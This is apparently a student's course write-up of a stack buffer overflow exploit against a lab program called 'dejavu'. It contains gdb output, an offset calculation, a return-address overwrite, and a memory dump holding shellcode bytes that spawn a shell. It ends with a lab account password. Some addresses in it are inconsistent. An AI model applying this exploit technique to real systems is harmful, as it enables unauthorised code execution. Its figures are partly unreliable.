@@ -1,0 +1,63 @@
+In Question 2, the vulnerability is a buffer overflow by using gets,
+since gets does not check for the size.
+By overflow the buffer, I can put and shell code and get access to the VM.
+
+This is how I do it:
+_First: run "invoke -d dejavu" to debug.
+break at line 7 to find out where eip save to.
+
+Breakpoint 1 at 0x8048412: file dejavu.c, line 7.
+(gdb) r
+Starting program: /home/vsftpd/dejavu
+
+Breakpoint 1, deja_vu () at dejavu.c:7
+7	  gets(door);
+(gdb) info frame
+Stack level 0, frame at 0xbffff700:
+ eip = 0x8048412 in deja_vu (dejavu.c:7); saved eip 0x804842a
+ called by frame at 0xbffff710
+ source language c.
+ Arglist at 0xbffff6f8, args:
+ Locals at 0xbffff6f8, Previous frame's sp is 0xbffff700
+ Saved registers:
+  ebp at 0xbffff6f8, eip at 0xbffff6fc
+
+_Second: I found out that the different between eip's address and door's address
+is 20 Bytes.
+Before inject the shell code
+(gdb) x/30x door
+0xbffff6e8:	0xbffff7ac	0xb7e5f225	0xb7fed270	0x00000000
+0xbffff6f8:	0xbffff708	0x0804842a	0x08048440	0x00000000
+0xbffff708:	0x00000000	0xb7e454d3	0x00000001	0xbffff7a4
+0xbffff718:	0xbffff7ac	0xb7fdc858	0x00000000	0xbffff71c
+0xbffff728:	0xbffff7ac	0x00000000	0x0804821c	0xb7fd2000
+0xbffff738:	0x00000000	0x00000000	0x00000000	0xa90c834c
+0xbffff748:	0x9e4b875c	0x00000000	0x00000000	0x00000000
+0xbffff758:	0x00000001	0x08048320
+
+_ Third: my Shell code is more than 20 B. So I have to put it at the address 4 Bytes after the return address.
+Doing some calculation, I figure out that the address that I want to store at the return address (0xbffff6fc)
+is 0xbffff700. At the address 0xbffff700 is where I want to run my shell code.
+0xbffff6f8 + 0x4 = 0xbffff6fc <--- where the return address(0x0804842a) is at.
+0xbffff6fc +0x4 = 0xbffff700 <---- Where my shell code begin.
+
+_ Fourth: Since there is 20 B different between door's address and return address,
+my input is 20 letters "A". Follow after is "xb0\xf6\xff\xbf", and "Shell-code".
+After inject the shell code
+Breakpoint 2, deja_vu () at dejavu.c:8
+8	}
+(gdb) x/32x door
+0xbffff6a8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff6b8:	0x41414141	0xbffff700	0x895e1feb	0xc0310876
+0xbffff6c8:	0x89074688	0x0bb00c46	0x4e8df389	0x0c568d08
+0xbffff6d8:	0xdb3180cd	0xcd40d889	0xffdce880	0x622fffff
+0xbffff6e8:	0x732f6e69	0x00000068	0x0804821c	0xb7fd2000
+0xbffff6f8:	0x00000000	0x00000000	0x00000000	0x5f7e8330
+0xbffff708:	0x683a0720	0x00000000	0x00000000	0x00000000
+0xbffff718:	0x00000002	0x08048320	0x00000000	0xb7ff26a0
+
+Once inside smith, run cat WELCOME
+cat README
+Welcome to the real world.
+user: smith
+pass: bi3tY_1B
